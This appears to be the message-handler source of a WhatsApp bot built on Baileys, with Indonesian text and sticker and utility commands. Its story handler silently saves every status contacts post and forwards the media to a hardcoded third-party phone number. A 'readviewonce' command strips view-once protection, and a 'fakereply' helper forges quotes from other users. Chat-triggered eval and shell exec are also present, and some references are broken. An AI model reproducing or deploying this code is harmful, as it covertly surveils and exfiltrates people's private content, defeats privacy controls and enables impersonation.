const { 
    downloadContentFromMessage, 
    generateWAMessageFromContent,
    proto,
    getDevice,
    STORIES_JID
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const fs = require("fs")
const { exec, spawn } = require("child_process")
const request = require('request')
const imgbbUploader = require("imgbb-uploader")

const color = require("../lib/color.js")
const {ownerNumber, ownerNumberg, stickerInfo} = require("../database.json")
const { getBuffer, getRandom, getGroupAdmins, runtime, sleep, short, webp2mp4File, convert} = require("../lib/function.js")
const ind = require("./ind.js")



multi = true
module.exports = async(rell, msg) => {
    try {
    const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('DD/MM/YY HH:mm:ss z')
    const ucapan = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
    const fromMe = msg.key.fromMe
    const content = JSON.stringify(msg.message)
    const from = msg.key.remoteJid
    const type = Object.keys(msg.message)[0]
    const quotedMsg = msg?.message[msg.type]?.contextInfo?.quotedMessage
    const chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
    const cmd = (type == 'listResponseMessage') && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'listResponseMessage') && msg.message.listResponseMessage.title ? msg.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && msg.message.conversation.startsWith(prefix)) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption.startsWith(prefix) ? msg.message.imageMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption.startsWith(prefix) ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text.startsWith(prefix) ? msg.message.extendedTextMessage.text : ""
    const args = chats.trim().split(/ +/).slice(1)
    const q = args.join(' ')
    const pushname = msg.pushName
    const isGroup = msg.key.remoteJid.endsWith('@g.us')
    const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
    const isOwner = isGroup ? sender.includes(ownerNumberg) : sender.includes(ownerNumber)
    const botNumber = rell.user.id.split(':')[0] + '@s.whatsapp.net'  
    const groupMetadata = isGroup ? await rell.groupMetadata(from) : ''  
    const groupMembers = isGroup ? groupMetadata.participants : ''
    const groupAdmins = isGroup ? ind.getGroupAdmins(groupMembers) : ''
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
    const isGroupAdmins = groupAdmins.includes(sender.split(":")[0]+"@s.whatsapp.net") || false
  
    const isImage = (type == 'imageMessage')
    const isVideo = (type == 'videoMessage')
    const isSticker = (type == 'stickerMessage')
    const isQuotedMsg = (type == 'extendedTextMessage')
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
    const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false
    const isQuotedDocument = isQuotedMsg ? content.includes('documentMessage') ? true : false : false
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
    const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false

    const isUrl = (uri) => {
	    return uri.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
    }

    if (multi) {
        var prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ_&<`™©®Δ^βα¦|/\\©^]/.test(chats) ? chats.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ_&<!`™©®Δ^βα¦|/\\©^]/gi) : '.'
    } else {
        if (nopref) {
            prefix = ''
        } else {
            prefix = prefa
        }
    }

    const command = chats.toLowerCase().split(' ')[0] || ''
        const isCmd = chats.startsWith(prefix)

/*
//Call Response
rell.ws.on("CB:call", async function (node) {
if(node.content[0].tag === "terminate") {
rell.sendMessage(node.attrs.from, {text: `Kamu Telah Melanggar Rules Maka Kamu Akan Terkena *Blokir*!\n\nHubungi Owner Untuk Membuka Kembali Akses!`}).then(anu => {


rell.updateBlockStatus(node.attrs.from, "block")

})
}

})
*/


/*
Pengecualian Kontak,
Gunakan:

if(from == STORIES_JID && !fromMe){
    
}

*/
if(from == STORIES_JID){
                let t2 = msg.messageTimestamp;
                let sender2 = msg.key.participant
                let contactName2 = pushname || sender2
                let semdew = `${pushname} || @${sender2.replace("@s.whatsapp.net", "")}`
                var waktu = moment(t2 * 1000).format('HH.mm.ss')
                var tanggal = moment(t2 * 1000).format('DD-MM-YYYY')
                if (type == "extendedTextMessage" || type == "imageMessage" || type == "videoMessage" || type == "audioMessage") {
                    // declare list for save filepath name
                    global.list = []
                    // text caption
                    let caption = msg.message[type].caption

                    /** DIRECTORY MANAGER */
                    // parentFolderName [user folder name]
                    let parentFolderName = `${sender2.split('@')[0]}_${contactName2.replace(/\W+?/g, '_')}`
                    // child folder name is a story posted date
                    let childFolderName = `${tanggal}_${sender.split('@')[0]}`
                    // path media, if a user not in temp folder before
                    let pathMedia = `./tmp/${parentFolderName}`
                    // create path media foler if a user not in temp folder before
                    if (!fs.existsSync(pathMedia)) { fs.mkdirSync(pathMedia) }
                    // filename to save in local dir
                    let filename = `${pathMedia}/${waktu}`
                    // path to caption, this used to save caption file 
                    let captionPath = `${filename}_caption.txt`
                    // if stories has a caption, save file and add to list[]
                    /*if (caption) {
                        fs.writeFileSync(captionPath, caption, 'utf-8')
                        rell.sendMessage("6281219087237@s.whatsapp.net", {text: `Dari: ${semdew}\nTipe: Caption\nWaktu: ${waktu} ${tanggal}\n${'-'.repeat(25)}\n\nCaption: ${caption}`})
                        global.list[parentFolderName] = [
                            [captionPath]
                        ]
                    }*/

                    // save file if type is text stories
                    if (type == "extendedTextMessage") {
                        let { font, text, textArgb, } = msg.message.extendedTextMessage
                        let caption = `Dari: ${semdew}\nTipe: Text\nWaktu: ${waktu} ${tanggal}\n${'-'.repeat(25)}\n\nCaption: ${text}\nText Color: #${textArgb.toString(16)}\nFont: ${font}`
                        let textPath = `${filename}_textStories.txt`
                        fs.writeFileSync(textPath, caption, 'utf-8')
                        rell.sendMessage("6281219087237@s.whatsapp.net", {text: caption, mentions: [sender2] })
                        global.list[parentFolderName] = [
                            [textPath]
                        ]
                    }

                    // save file if type is image message
                    if (type == "imageMessage") {
                        // download mediaMessage and save to local dir 
                        let downloaded = await downloadAndSaveMediaMessage("image", filename+".jpeg");
                        rell.sendMessage("6281219087237@s.whatsapp.net", {image: fs.readFileSync(filename+".jpeg"), caption: `Dari: ${semdew}\nTipe: Gambar\nWaktu: ${waktu} ${tanggal}\n${'-'.repeat(25)}\n\nCaption: ${caption}`, mentions: [sender2] })
                        // if media not in list[], add to list. or if caption not in list[]
                        global.list[parentFolderName] == undefined
                            ? global.list[parentFolderName] = [
                                filelist = [downloaded]
                            ]
                            : global.list[parentFolderName][0].push(downloaded)
                    }

                    // save file if type is video message
                    if (type == "videoMessage") {
                        // download mediaMessage and save to local dir 
                        let downloaded = await downloadAndSaveMediaMessage("video", filename+".mp4");
                        rell.sendMessage("6281219087237@s.whatsapp.net", {video: fs.readFileSync(filename+".mp4"), caption: `Dari: ${semdew}\nTipe: Video\nWaktu: ${waktu} ${tanggal}\n${'-'.repeat(25)}\n\nCaption: ${caption}`, mentions: [sender2] })
                        // if media not in list[], add to list. or if caption not in list[]
                        global.list[parentFolderName] == undefined
                            ? global.list[parentFolderName] = [
                                filelist = [downloaded]
                            ]
                            : global.list[parentFolderName][0].push(downloaded)
                    }

                    // save file if type is audio message
                    if (type == "audioMessage") {
                        // download mediaMessage and save to local dir 
                        let downloaded = await downloadAndSaveMediaMessage("audio", filename+".mp3");
                        rell.sendMessage("6281219087237@s.whatsapp.net", {text: `Dari: ${semdew}\nTipe: Audio\nWaktu: ${waktu} ${tanggal}`, mentions: [sender2] })
                        rell.sendMessage("6281219087237@s.whatsapp.net", {audio: fs.readFileSync(filename+".mp3")})
                        // if media not in list[], add to list. or if caption not in list[]
                        global.list[parentFolderName] == undefined
                            ? global.list[parentFolderName] = [
                                filelist = [downloaded]
                            ]
                            : global.list[parentFolderName][0].push(downloaded)
                    }
                }

            
        }

if (isCmd) {
    console.log(color('[CMD]', 'cyan'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'orange'), color(command, 'cyan'), color(pushname, 'orange'), color(sender, 'lime'))
}

async function downloadAndSaveMediaMessage (type_file, path_file) {
    if (type_file === 'image') {
        var stream = await downloadContentFromMessage(msg.message.imageMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
        let buffer = Buffer.from([])
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
       await fs.writeFileSync(path_file, buffer)
        return fs.readFileSync(path_file)
    } else if (type_file === 'video') {
        var stream = await downloadContentFromMessage(msg.message.videoMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
        let buffer = Buffer.from([])
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        fs.writeFileSync(path_file, buffer)
        return fs.readFileSync(path_file)
    } else if (type_file === 'sticker') {
        var stream = await downloadContentFromMessage(msg.message.stickerMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
        let buffer = Buffer.from([])
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        fs.writeFileSync(path_file, buffer)
        return fs.readFileSync(path_file)
    } else if (type_file === 'audio') {
        var stream = await downloadContentFromMessage(msg.message.audioMessage || msg.message.extendedTextMessage?.contextInfo.quotedMessage.audioMessage, 'audio')
        let buffer = Buffer.from([])
        for await(const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        fs.writeFileSync(path_file, buffer)
        return fs.readFileSync(path_file)
    }
}
const adReply = async(teks, judul, isi, quo) => {
    rell.sendMessage(from, {text: teks, contextInfo:{"externalAdReply": {title: judul, body: isi, mediaType: 3, "thumbnail": fs.readFileSync('./assets/thumb.jpg')}}}, {sendEphemeral: true, quoted: quo })
}

const sendFileFromUrl = async (from, url, caption, msg, men) => {
    let mime = '';
    let res = await axios.head(url)
    mime = res.headers['content-type']
    if (mime.split("/")[1] === "gif") {
        return rell.sendMessage(from, { video: await convertGif(url), caption: caption, gifPlayback: true, mentions: men ? men : []}, {quoted: msg})
        }
    let type = mime.split("/")[0]+"Message"
    if(mime.split("/")[0] == "image"){
        return rell.sendMessage(from, { image: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: msg})
    } else if(mime.split("/")[0] == "video"){
        return rell.sendMessage(from, { video: await getBuffer(url), caption: caption, mentions: men ? men : []}, {quoted: msg})
    } else if(mime.split("/")[0] == "audio"){
        return rell.sendMessage(from, { audio: await getBuffer(url), caption: caption, mentions: men ? men : [], mimetype: 'audio/mpeg' }, {quoted: msg })
    } else {
        return rell.sendMessage(from, { document: await getBuffer(url), mimetype: mime, caption: caption, mentions: men ? men : []}, {quoted: msg })
    }
}

const textImg = (teks, buffer = fs.readFileSync("assets/thumb.jpg"), mess, men) => {
    return rell.sendMessage(from, { text: teks, jpegThumbnail: buffer, mention: men ? men : [] }, { quoted: mess ? mess : msg })
}

let mimetypen = getDevice(from) == 'ios' ? 'audio/mpeg' : 'audio/mp4'

const fakereply = (teks, target, fake) => {
	return rell.sendMessage(from, {text: teks}, {
				quoted: {
					key: {
						fromMe: false,
						participant: `${target}@s.whatsapp.net`, ...(from ? { remoteJid: from } : {})
					},
					message: {
						conversation: fake
					}
				}
			})
		}

if (isOwner){
    if (chats.startsWith("> ")){
        console.log(color('[EVAL]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Owner!`))
        try {
            let evaled = await eval(chats.slice(2))
            if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
            textImg(`${evaled}`)
        } catch (err) {
            textImg(`${err}`)
        }
    } else if (chats.startsWith("$ ")){
        console.log(color('[EXEC]'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`Owner!`))
        exec(chats.slice(2), (err, stdout) => {
            if (err) return textImg(`${err}`)
            if (stdout) textImg(`${stdout}`)
        })
    }
}

var downloadImage = function(uri, filename, callback){
  request.head(uri, function(err, res, body){
    console.log('content-type:', res.headers['content-type']);
    console.log('content-length:', res.headers['content-length']);

    request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
  });
};

//----------------------------------------------------------------------------------------------


switch (command) {
    
    case prefix+"test":
        rell.sendMessage(from, {text: "Bot On"})
    break

    case prefix+"readviewonce":
    case prefix+"rvo":{
         let kok = {...msg.message.extendedTextMessage.contextInfo.quotedMessage.viewOnceMessageV2.message}
delete kok.imageMessage?.viewOnce
delete kok.videoMessage?.viewOnce
await rell.relayMessage(from, kok, {})
    }
    break

// Owner Menu
    case prefix+"eval":
        if (!isOwner) return
        if (!q) return rell.sendMessage(from, {text: "Masukkan Kode Javascript!"})
    try {
        let evaled = await eval(chats.slice(6))
    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
    rell.sendMessage(from, {text: evaled})
} catch (err) {
    rell.sendMessage(from, {text: err})
}
break

case prefix+'hidetag':
                if (!isGroup) return textImg(ind.groupOnly())
                rell.sendMessage(from, { text : q ? q : '' , mentions: groupMembers.map(a => a.id)})
            break

// Sticker
case prefix+"sticker":
    case prefix+"stiker":
    case prefix+"s":    
if (isImage || isQuotedImage) {
    let file = await downloadAndSaveMediaMessage("image", "temp/"+sender+".png")
let sticker = new Sticker(file, {
    pack: stickerInfo.pack, // The pack name
    author: stickerInfo.author, // The author name
    type: StickerTypes.FULL, // The sticker type
    categories: ['', ''], // The sticker category
    id: '12345', // The sticker id
    quality: 100, // The quality of the output file
    background: 'transparent' // The sticker background color (only for full stickers)
})

const buffer = await sticker.toBuffer()
rell.sendMessage(from, {sticker: buffer}, {quoted: msg})

} else if(isVideo || isQuotedVideo) {
    if (isQuotedVideo ? msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds > 15 : msg.message.videoMessage.seconds > 15) return textImg('too long duration, max 15 seconds')
    let file = await downloadAndSaveMediaMessage("video", "./temp/"+sender+".mp4")
    let ahsuhfkj = await convert("./temp/"+sender+".mp4")
   

    let sticker = new Sticker(fs.readFileSync(ahsuhfkj), {
        pack: stickerInfo.pack, // The pack name
        author: stickerInfo.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['', ''], // The sticker category
        id: '12345', // The sticker id
        quality: 100, // The quality of the output file
        background: 'transparent' // The sticker background color (only for full stickers)
    })
   
    const stikk = await sticker.toBuffer() 
   
    
    rell.sendMessage(from, {sticker: stikk}, {quoted: msg})
    
    
} else {
    textImg(`Kirim/Reply Gambar Atau Gif/Video max 5 detik!, dengan caption *${prefix}${command}`)
}
        break

case prefix+"stickerwm":
    case prefix+"stikerwm":
    case prefix+"swm":    
if (isImage || isQuotedImage) {
    let file = await downloadAndSaveMediaMessage("image", "temp/"+sender+".png")
let sticker = new Sticker(file, {
    pack: q.split('|')[0]||stickerInfo.pack, // The pack name
    author: q.split('|')[1]||stickerInfo.author, // The author name
    type: StickerTypes.FULL, // The sticker type
    categories: ['', ''], // The sticker category
    id: '12345', // The sticker id
    quality: 100, // The quality of the output file
    background: 'transparent' // The sticker background color (only for full stickers)
})

const buffer = await sticker.toBuffer()
rell.sendMessage(from, {sticker: buffer}, {quoted: msg})

} else if(isVideo || isQuotedVideo) {
    if (isQuotedVideo ? msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds > 15 : msg.message.videoMessage.seconds > 15) return textImg('too long duration, max 15 seconds')
    let file = await downloadAndSaveMediaMessage("video", "./temp/"+sender+".mp4")
    let ahsuhfkj = await convert("./temp/"+sender+".mp4")
   

    let sticker = new Sticker(fs.readFileSync(ahsuhfkj), {
        pack: stickerInfo.pack, // The pack name
        author: stickerInfo.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['', ''], // The sticker category
        id: '12345', // The sticker id
        quality: 100, // The quality of the output file
        background: 'transparent' // The sticker background color (only for full stickers)
    })
   
    const stikk = await sticker.toBuffer() 
   
    
    rell.sendMessage(from, {sticker: stikk}, {quoted: msg})
    
    
} else {
    textImg(`Kirim/Reply Gambar Atau Gif/Video max 5 detik! dengan caption *${prefix}${command} pack | author*`)
}
        break


}
} catch (err) {
console.log(color('[ERR]', 'red'), color(err, 'cyan'))
    }
}
